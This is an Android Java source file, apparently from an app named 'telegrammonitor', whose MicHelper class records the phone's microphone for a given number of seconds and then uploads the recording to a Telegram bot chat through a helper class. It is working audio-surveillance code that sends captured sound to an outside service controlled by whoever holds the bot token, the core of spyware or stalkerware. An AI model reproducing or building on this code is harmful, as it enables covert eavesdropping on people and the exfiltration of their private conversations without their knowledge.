package com.nehal.telegrammonitor;

import android.content.Context;
import android.media.MediaRecorder;
import android.os.Environment;
import java.io.File;
import java.io.IOException;

public class MicHelper {

    private static MediaRecorder recorder;

    public static void recordAndSend(Context context, String botToken, String chatId, int durationSec) {
        File outputFile = new File(context.getExternalFilesDir(Environment.DIRECTORY_MUSIC), "mic_record.3gp");

        try {
            recorder = new MediaRecorder();
            recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
            recorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
            recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
            recorder.setOutputFile(outputFile.getAbsolutePath());
            recorder.prepare();
            recorder.start();

            new Thread(() -> {
                try {
                    Thread.sleep(durationSec * 1000L);
                } catch (InterruptedException e) {
                    e.printStackTrace();
                }

                try {
                    recorder.stop();
                    recorder.release();
                    recorder = null;

                    TelegramUploader.sendAudio(botToken, chatId, outputFile.getAbsolutePath());
                } catch (Exception e) {
                    e.printStackTrace();
                }

            }).start();

        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}